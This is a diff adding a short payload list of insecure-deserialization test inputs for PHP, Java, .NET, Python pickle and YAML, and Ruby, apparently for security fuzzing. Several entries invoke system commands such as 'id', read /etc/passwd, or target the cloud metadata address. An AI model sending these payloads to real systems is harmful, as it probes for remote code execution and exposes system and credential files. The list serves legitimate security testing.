@@ -1,0 +1,16 @@
+# Deserialization advanced payloads
+O:8:"stdClass":1:{s:4:"test";s:4:"test";}
+a:1:{s:5:"admin";b:1;}
+{"@type":"java.lang.AutoCloseable","@class":"java.io.File","path":"/etc/passwd"}
+{"@type":"java.net.Inet4Address","val":"169.254.169.254"}
+{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework"}
+{"__class__":"subprocess.Popen","args":["id"]}
+rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==
+aced0005737200116a6176612e7574696c2e486173684d6170
+!!python/object/apply:os.system ["id"]
+--- !ruby/object:Gem::Installer {}
+{"rce":"`id`"}
+{"toString":"${7*7}"}
+{"readObject":"../../../../etc/passwd"}
+{"pickle":"cos\nsystem\n(S'id'\ntR."}
+{"yaml":"!!javax.script.ScriptEngineManager []"}
